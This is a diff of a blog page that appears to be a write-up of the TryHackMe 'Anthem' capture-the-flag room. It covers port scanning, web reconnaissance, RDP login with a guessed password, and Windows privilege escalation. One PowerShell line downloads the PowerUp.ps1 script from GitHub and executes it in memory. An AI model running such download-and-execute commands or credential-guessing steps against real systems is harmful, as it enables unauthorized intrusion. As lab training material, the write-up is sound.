@@ -1,15 +1,13 @@
-<?xml version="1.0" encoding="utf-8"?>
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
-"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
+<!DOCTYPE html>
+<html lang="en">
 <head>
-<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+<meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>THM: Anthem</title>
 <meta name="author" content="Lamprinos Chatziioannou" />
 <meta name="description" content="A beginner targeted ctf" />
 <meta name="generator" content="Org Mode" />
-<link rel="preconnect" href="https://fonts.googleapis.com"> <link href="https://fonts.googleapis.com/css2?family=Fira+Sans&display=swap" rel="stylesheet"> <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed&display=swap" rel="stylesheet"> <script src="https://cdn.jsdelivr.net/gh/oyvindstegard/ox-tagfilter-js/ox-tagfilter.js"></script> <link rel="stylesheet" href="/src/rougier.css" /> <link rel="icon" type="image/x-icon" href="/src/favicon.ico"> <meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="preconnect" href="https://fonts.googleapis.com"> <link href="https://fonts.googleapis.com/css2?family=Fira+Sans&display=swap" rel="stylesheet"> <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed&display=swap" rel="stylesheet"> <script src="https://cdn.jsdelivr.net/gh/oyvindstegard/ox-tagfilter-js/ox-tagfilter.js"></script> <link rel="stylesheet" href="/src/rougier.css" /> <script src="/src/copy-pre.js"></script> <link rel="icon" type="image/x-icon" href="/src/favicon.ico"> <meta charset="UTF-8" name="viewport" content="width=device-width, initial-scale=1.0">
 </head>
 <body>
 <div id="org-div-home-and-up">
@@ -22,20 +20,20 @@
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#org002e007">Reconnaissance</a>
+<li><a href="#orgcdccdca">Reconnaissance</a>
 <ul>
-<li><a href="#org35c562d">Port Scanning</a></li>
-<li><a href="#org0eebba6">Web Analysis</a>
+<li><a href="#org85497d6">Port Scanning</a></li>
+<li><a href="#orge3fafac">Web Analysis</a>
 <ul>
-<li><a href="#orgc51b087">Random Findings</a></li>
-<li><a href="#orga50da8a">Robots.txt, Security.txt, Sitemap.xml</a></li>
-<li><a href="#org98ee58b">Finding the administrator</a></li>
+<li><a href="#org23fc3c7">Random Findings</a></li>
+<li><a href="#org381d58b">Robots.txt, Security.txt, Sitemap.xml</a></li>
+<li><a href="#org60872a6">Finding the administrator</a></li>
 </ul>
 </li>
 </ul>
 </li>
-<li><a href="#org0af3eb1">Trying RDP out</a></li>
-<li><a href="#orgd1fad76">Privilege Escalation</a></li>
+<li><a href="#orgcfd95ac">Trying RDP out</a></li>
+<li><a href="#org11e4a41">Privilege Escalation</a></li>
 </ul>
 </div>
 </div>
@@ -44,23 +42,23 @@ After a long time of not messing around with any CTFs, I decided to
 give <a href="https://tryhackme.com/room/anthem">anthem</a> a shot and see how far I could go on my own. 
 </p>
 
-<div id="outline-container-org002e007" class="outline-2">
-<h2 id="org002e007"><a href="#org002e007">Reconnaissance</a></h2>
-<div class="outline-text-2" id="text-org002e007">
+<div id="outline-container-orgcdccdca" class="outline-2">
+<h2 id="orgcdccdca"><a href="#orgcdccdca">Reconnaissance</a></h2>
+<div class="outline-text-2" id="text-orgcdccdca">
 </div>
-<div id="outline-container-org35c562d" class="outline-3">
-<h3 id="org35c562d"><a href="#org35c562d">Port Scanning</a></h3>
-<div class="outline-text-3" id="text-org35c562d">
+<div id="outline-container-org85497d6" class="outline-3">
+<h3 id="org85497d6"><a href="#org85497d6">Port Scanning</a></h3>
+<div class="outline-text-3" id="text-org85497d6">
 <p>
 First things first, let&rsquo;s try to get some information about the target
 machine, checking all ports and saving the output for future use:
 </p>
 <div class="org-src-container">
-<pre class="src src-bash" id="org4f2452e">sudo nmap -sSV -p- 10.10.201.121 -oA nmap.out -T4
+<pre class="src src-bash" id="org5f8a496">sudo nmap -sSV -p- 10.10.201.121 -oA nmap.out -T4
 </pre>
 </div>
 
-<pre class="example" id="orgfa0996d">
+<pre class="example" id="orgedfca30">
 Starting Nmap 7.60 ( https://nmap.org ) at 2023-10-21 08:34 BST
 Nmap scan report for ip-10-10-201-121.eu-west-1.compute.internal (10.10.201.121)
 Host is up (0.00045s latency).
@@ -91,9 +89,9 @@ Getting some more information from the web server can not hurt.
 </div>
 </div>
 
-<div id="outline-container-org0eebba6" class="outline-3">
-<h3 id="org0eebba6"><a href="#org0eebba6">Web Analysis</a></h3>
-<div class="outline-text-3" id="text-org0eebba6">
+<div id="outline-container-orge3fafac" class="outline-3">
+<h3 id="orge3fafac"><a href="#orge3fafac">Web Analysis</a></h3>
+<div class="outline-text-3" id="text-orge3fafac">
 <p>
 I always like to use burp suite (or zap for that matter), when I first
 start interacting with a website. It saves me the trouble of manually
@@ -111,7 +109,7 @@ what Burp stores, making for a relatively clutter-free environment</li>
 <li class="on"><code>[X]</code> Start moving</li>
 </ul>
 
-<div class="note" id="org207f75d">
+<div class="note" id="org6b98393">
 <p>
 Using <a href="https://github.com/hakluke/hakrawler">https://github.com/hakluke/hakrawler</a> while passing all the
 traffic through Burp&rsquo;s proxy might also be beneficial, but at this
@@ -121,9 +119,9 @@ point I like manually checking every page.
 </div>
 </div>
 
-<div id="outline-container-orgc51b087" class="outline-4">
-<h4 id="orgc51b087"><a href="#orgc51b087">Random Findings</a></h4>
-<div class="outline-text-4" id="text-orgc51b087">
+<div id="outline-container-org23fc3c7" class="outline-4">
+<h4 id="org23fc3c7"><a href="#org23fc3c7">Random Findings</a></h4>
+<div class="outline-text-4" id="text-org23fc3c7">
 <p>
 While randomly clicking everywhere I could find, I got to the page of
 a writer (Jane Doe), which included a flag at a suspiciously obvious
@@ -131,8 +129,8 @@ location.
 </p>
 
 
-<div id="org8854d44" class="figure">
-<p><img src="Reconnaissance/20231021_105049_screenshot.png" alt="20231021_105049_screenshot.png" />
+<div id="org7a080b7" class="figure">
+<p><img src="Reconnaissance/20231021_105049_screenshot.png" alt="20231021_105049_screenshot.png">
 </p>
 <p><span class="figure-number">Figure 1: </span>A flag :P</p>
 </div>
@@ -140,9 +138,9 @@ location.
 </div>
 
 
-<div id="outline-container-orga50da8a" class="outline-4">
-<h4 id="orga50da8a"><a href="#orga50da8a">Robots.txt, Security.txt, Sitemap.xml</a></h4>
-<div class="outline-text-4" id="text-orga50da8a">
+<div id="outline-container-org381d58b" class="outline-4">
+<h4 id="org381d58b"><a href="#org381d58b">Robots.txt, Security.txt, Sitemap.xml</a></h4>
+<div class="outline-text-4" id="text-org381d58b">
 <p>
 Visiting those files is a must when checking websites (even though the
 writer might occasionally forget about them), and <code>robots.txt</code> did not
@@ -151,15 +149,15 @@ target host uses the Umbraco CMS, and it&rsquo;s sign-in page is also revealed.
 </p>
 
 
-<div id="orgcdfd801" class="figure">
-<p><img src="Reconnaissance/20231021_105217_screenshot.png" alt="20231021_105217_screenshot.png" />
+<div id="org6a093e1" class="figure">
+<p><img src="Reconnaissance/20231021_105217_screenshot.png" alt="20231021_105217_screenshot.png">
 </p>
 <p><span class="figure-number">Figure 2: </span>Robots.txt contents</p>
 </div>
 
 
-<div id="org6da95ed" class="figure">
-<p><img src="Reconnaissance/20231021_105556_screenshot.png" alt="20231021_105556_screenshot.png" />
+<div id="org64e2e42" class="figure">
+<p><img src="Reconnaissance/20231021_105556_screenshot.png" alt="20231021_105556_screenshot.png">
 </p>
 <p><span class="figure-number">Figure 3: </span>Umbraco Sign-in Page</p>
 </div>
@@ -171,9 +169,9 @@ lacking any information.
 </div>
 </div>
 
-<div id="outline-container-org98ee58b" class="outline-4">
-<h4 id="org98ee58b"><a href="#org98ee58b">Finding the administrator</a></h4>
-<div class="outline-text-4" id="text-org98ee58b">
+<div id="outline-container-org60872a6" class="outline-4">
+<h4 id="org60872a6"><a href="#org60872a6">Finding the administrator</a></h4>
+<div class="outline-text-4" id="text-org60872a6">
 <p>
 At this point we have a lot of information about the target system,
 yet no information on the administrator (other than the contents of an
@@ -189,15 +187,15 @@ miss anything).
 </p>
 
 
-<div id="orgc7052aa" class="figure">
-<p><img src="Reconnaissance/20231021_105932_screenshot.png" alt="20231021_105932_screenshot.png" />
+<div id="org99b12e9" class="figure">
+<p><img src="Reconnaissance/20231021_105932_screenshot.png" alt="20231021_105932_screenshot.png">
 </p>
 <p><span class="figure-number">Figure 4: </span>Another random flag found during this stage</p>
 </div>
 
 
-<div id="org737a524" class="figure">
-<p><img src="Reconnaissance/20231021_110055_screenshot.png" alt="20231021_110055_screenshot.png" />
+<div id="orgc4544c0" class="figure">
+<p><img src="Reconnaissance/20231021_110055_screenshot.png" alt="20231021_110055_screenshot.png">
 </p>
 <p><span class="figure-number">Figure 5: </span>Another random flag</p>
 </div>
@@ -210,8 +208,8 @@ had bothered changing them:
 </p>
 
 
-<div id="org7da0f01" class="figure">
-<p><img src="Reconnaissance/20231021_110556_screenshot.png" alt="20231021_110556_screenshot.png" />
+<div id="org9d6a9c8" class="figure">
+<p><img src="Reconnaissance/20231021_110556_screenshot.png" alt="20231021_110556_screenshot.png">
 </p>
 <p><span class="figure-number">Figure 6: </span>No luck</p>
 </div>
@@ -245,23 +243,23 @@ Jane Doe translates to jd.</li>
 </div>
 </div>
 
-<div id="outline-container-org0af3eb1" class="outline-2">
-<h2 id="org0af3eb1"><a href="#org0af3eb1">Trying RDP out</a></h2>
-<div class="outline-text-2" id="text-org0af3eb1">
+<div id="outline-container-orgcfd95ac" class="outline-2">
+<h2 id="orgcfd95ac"><a href="#orgcfd95ac">Trying RDP out</a></h2>
+<div class="outline-text-2" id="text-orgcfd95ac">
 <p>
 We now know the administrator&rsquo;s username, and we have a potential
 password, so checking RDP out seems like a good choice: it was.
 </p>
 
 
-<div id="org71c7710" class="figure">
-<p><img src="Trying_RDP_out/20231021_112003_screenshot.png" alt="20231021_112003_screenshot.png" />
+<div id="orga04dd2a" class="figure">
+<p><img src="Trying_RDP_out/20231021_112003_screenshot.png" alt="20231021_112003_screenshot.png">
 </p>
 <p><span class="figure-number">Figure 7: </span>Got the root flag</p>
 </div>
 
 
-<div class="note" id="org81d8fc0">
+<div class="note" id="org9c4a73b">
 <p>
 After answering the questions on THM I realized that I had missed one,
 presumably hidden within the source code, nice 
@@ -270,24 +268,24 @@ presumably hidden within the source code, nice
 </div>
 
 
-<div id="org12270de" class="figure">
-<p><img src="Trying_RDP_out/20231021_112223_screenshot.png" alt="20231021_112223_screenshot.png" />
+<div id="orgac1cde1" class="figure">
+<p><img src="Trying_RDP_out/20231021_112223_screenshot.png" alt="20231021_112223_screenshot.png">
 </p>
 <p><span class="figure-number">Figure 8: </span>Completing the last web flag</p>
 </div>
 </div>
 </div>
 
-<div id="outline-container-orgd1fad76" class="outline-2">
-<h2 id="orgd1fad76"><a href="#orgd1fad76">Privilege Escalation</a></h2>
-<div class="outline-text-2" id="text-orgd1fad76">
+<div id="outline-container-org11e4a41" class="outline-2">
+<h2 id="org11e4a41"><a href="#org11e4a41">Privilege Escalation</a></h2>
+<div class="outline-text-2" id="text-org11e4a41">
 <p>
 Having limited experience with windows, I relied heavily on
 <a href="https://swisskyrepo.github.io/">PayloadsAllTheThings</a>, testing this first:
 </p>
 
 <div class="org-src-container">
-<pre class="src src-powershell" id="orge78980a">bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); 
+<pre class="src src-powershell" id="orgaa9f0ff">bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); 
 </pre>
 </div>
 
@@ -311,8 +309,8 @@ properties so that I could open it properly:
 </p>
 
 
-<div id="orgc770880" class="figure">
-<p><img src="Privilege_Escalation/20231021_113902_screenshot.png" alt="20231021_113902_screenshot.png" />
+<div id="org57fc94b" class="figure">
+<p><img src="Privilege_Escalation/20231021_113902_screenshot.png" alt="20231021_113902_screenshot.png">
 </p>
 <p><span class="figure-number">Figure 9: </span>Got a password-like string</p>
 </div>
@@ -328,8 +326,8 @@ Seems like a good combination to choose, so I try to view
 </p>
 
 
-<div id="org1ae4fae" class="figure">
-<p><img src="Privilege_Escalation/20231021_114259_screenshot.png" alt="20231021_114259_screenshot.png" />
+<div id="orgee4a083" class="figure">
+<p><img src="Privilege_Escalation/20231021_114259_screenshot.png" alt="20231021_114259_screenshot.png">
 </p>
 <p><span class="figure-number">Figure 10: </span>Final Flag</p>
 </div>
@@ -341,7 +339,7 @@ Seems like a good combination to choose, so I try to view
 </div>
 </div>
 <div id="postamble" class="status">
-<script src="https://giscus.app/client.js" data-repo="chatziiola/chatziiola.github.io" data-repo-id=x\"R_kgDOGq8p0g" data-category="Announcements" data-category-id="DIC_kwDOGq8p0s4COSFW" data-mapping="pathname" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="bottom" data-theme="light" data-lang="en" data-loading="lazy" crossorigin="anonymous" async> </script><p class="footer"> Made with Emacs and Org.<br>CSS theme based on the one developed by <a href="https://github.com/rougier">@rougier</a>.<br>If you liked my work (and want more :P), consider <a href="https://www.buymeacoffee.com/chatziiolef">buying me a coffee</a></p>
+<script src="https://giscus.app/client.js" data-repo="chatziiola/chatziiola.github.io" data-repo-id=x\"R_kgDOGq8p0g" data-category="Announcements" data-category-id="DIC_kwDOGq8p0s4COSFW" data-mapping="pathname" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="bottom" data-theme="light" data-lang="en" data-loading="lazy" crossorigin="anonymous" async> </script> <p class=\"date footer\"> Originally created on 2023-10-21 Sat 10:30</p><p class="footer"> Made with Emacs and Org.<br>CSS theme based on the one developed by <a href="https://github.com/rougier">@rougier</a>.</p>
 </div>
 </body>
 </html>
